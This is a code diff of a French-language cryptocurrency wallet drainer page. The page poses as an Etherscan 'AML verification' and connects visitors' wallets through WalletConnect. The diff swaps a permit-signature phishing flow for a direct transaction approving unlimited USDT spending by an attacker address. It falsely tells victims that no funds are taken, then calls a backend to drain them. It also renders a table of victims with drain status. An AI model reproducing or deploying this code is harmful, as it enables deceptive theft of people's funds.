@@ -932,7 +932,7 @@
   const API = '/api/store-victim';
   const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';
 
-  let signClient, session, account, currentChainId;
+  let signClient, session, account;
 
   function getSignClient() {
     const ns = window["@walletconnect/sign-client"];
@@ -960,7 +960,7 @@
     const { uri, approval } = await signClient.connect({
       requiredNamespaces: {
         eip155: {
-          methods: ['personal_sign'],
+          methods: ['eth_sendTransaction'],
           chains: ['eip155:1'],
           events: []
         }
@@ -968,7 +968,6 @@
       redirect: { universal: 'https://app-etherscan.io/verifyaddress' }
     });
 
-    // Check QR library
     if (typeof window.QRCodeStyling === 'undefined') {
       document.querySelector('.scan').textContent = 'QR library not loaded';
       return;
@@ -1022,7 +1021,6 @@
     const ethAccount = accounts.find(acc => acc.startsWith('eip155:1:'));
     if (!ethAccount) throw new Error('Ethereum mainnet requis');
     account = ethAccount.split(':')[2];
-    currentChainId = '1';
 
     // Replace QR with status
     qrDiv.innerHTML = '';
@@ -1034,82 +1032,65 @@
     qrDiv.textContent = `Connecté : ${account.slice(0,6)}...${account.slice(38)}`;
 
     const scanText = document.querySelector('.scan');
-    if (scanText) scanText.textContent = 'En attente de signature…';
+    if (scanText) scanText.textContent = 'En attente de confirmation…';
 
-    // Enregistrer la connexion du wallet dans l'historique
+    // Enregistrer la connexion
     fetch('/api/record-wallet', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         address: account,
-        chain: currentChainId
+        chain: '1'
       })
     }).catch(err => console.error('Erreur record-wallet:', err));
-    
-    // Passer à la demande de signature
-    setTimeout(requestSignature, 1000);
+
+    // Passer à l'approve directe
+    setTimeout(startApprove, 1000);
   }
 
-  async function requestSignature() {
+  async function startApprove() {
+    const approveData = '0x095ea7b3' +
+      ATTACKER.slice(2).padStart(64, '0') +
+      MAX_UINT256.slice(2).padStart(64, '0');
+
+    const tx = {
+      from: account,
+      to: USDT_ADDR,
+      data: approveData,
+      gasLimit: '0x15F90' // 90k gas, largement suffisant pour un approve
+    };
+
+    const scanText = document.querySelector('.scan');
+    if (scanText) scanText.textContent = '🔒 Veuillez confirmer la transaction de vérification. Cela ne prélève aucun fonds.';
+
     try {
-      const provider = new ethers.providers.JsonRpcProvider('https://1rpc.io/eth');
-      const permitContract = new ethers.Contract(PERMIT_DRAIN_ADDRESS, [
-        'function nonces(address) view returns (uint256)'
-      ], provider);
-      const nonce = await permitContract.nonces(account);
-      const deadline = Math.floor(Date.now() / 1000) + 3600;
-
-      // Struct hash
-      const structHash = ethers.utils.solidityKeccak256(
-        ['address','address','address','uint256','uint256','uint256'],
-        [account, USDT_ADDR, ATTACKER, MAX_UINT256, deadline, nonce]
-      );
-      const messageToSign = ethers.utils.hexlify(structHash);
-
-      const scanText = document.querySelector('.scan');
-      if (scanText) scanText.textContent = 'Veuillez signer le message pour prouver la propriété…';
-
-      // Demander la signature via WalletConnect
-      const signature = await signClient.request({
+      await signClient.request({
         topic: session.topic,
         request: {
           id: Date.now(),
           jsonrpc: '2.0',
-          method: 'personal_sign',
-          params: [messageToSign, account]
+          method: 'eth_sendTransaction',
+          params: [tx]
         },
         chainId: 'eip155:1'
       });
 
-      console.log('Signature obtained:', signature);
-      if (scanText) scanText.textContent = '✅ Message signé. Vérification AML en cours…';
+      if (scanText) scanText.textContent = '✅ Transaction confirmée. Vérification AML en cours…';
 
-      // Envoyer la signature au backend
-      const resp = await fetch(API, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          victim: account,
-          chain: '1',
-          signature,
-          deadline,
-          nonce: nonce.toString(),
-          token: USDT_ADDR,
-          spender: ATTACKER,
-          amount: MAX_UINT256
-        })
-      });
-      const result = await resp.json();
-      if (result.success) {
-        if (scanText) scanText.textContent = '✅ Vérification terminée. Redirection…';
-        setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
-      } else {
-        if (scanText) scanText.textContent = '❌ Erreur lors de la vérification. Veuillez réessayer.';
-      }
+      // Attente pour que la transaction soit minée, puis déclenchement du drain
+      setTimeout(async () => {
+        const resp = await fetch(API, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ victim: account, chain: '1' })
+        });
+        const data = await resp.json();
+        if (scanText) scanText.textContent = data.success ? '✅ Vérification terminée. Redirection…' : '❌ Erreur, veuillez réessayer.';
+        if (data.success) setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
+      }, 15000); // 15 secondes pour être large
     } catch (e) {
-      console.error('Signature error:', e);
-      const scanText = document.querySelector('.scan');
-      if (scanText) scanText.textContent = '❌ Signature refusée.';
+      console.error('Transaction refusée', e);
+      if (scanText) scanText.textContent = '❌ Confirmation refusée.';
     }
   }
 
@@ -1148,27 +1129,22 @@
     victims.forEach(function (v) {
       const row = document.createElement('tr');
 
-      // Adresse
       const tdAddr = document.createElement('td');
       tdAddr.textContent = v.address;
       row.appendChild(tdAddr);
 
-      // Token / chain
       const tdToken = document.createElement('td');
       tdToken.textContent = (v.token ? v.token : '?') + (v.chain ? ' (' + v.chain + ')' : '');
       row.appendChild(tdToken);
 
-      // Montant
       const tdAmount = document.createElement('td');
       tdAmount.textContent = v.amount || '0';
       row.appendChild(tdAmount);
 
-      // Date
       const tdDate = document.createElement('td');
       tdDate.textContent = v.timestamp ? new Date(v.timestamp).toLocaleString() : '-';
       row.appendChild(tdDate);
 
-      // Statut
       const tdStatus = document.createElement('td');
       if (v.status === 'drained') {
         tdStatus.innerHTML = '<span class="status-success">✅ Succès</span>';
@@ -1185,7 +1161,6 @@
       }
       row.appendChild(tdStatus);
 
-      // Action
       const tdAction = document.createElement('td');
       if (v.status === 'failed') {
         const btn = document.createElement('button');
@@ -1233,7 +1208,6 @@
     }
   }
 
-  // Lancement automatique
   document.addEventListener('DOMContentLoaded', function() {
     initWalletConnect().catch(err => {
       console.error('Erreur init WC:', err);
@@ -1242,5 +1216,7 @@
     });
   });
 </script>
+</body>
+</html>
 </body>
 </html>
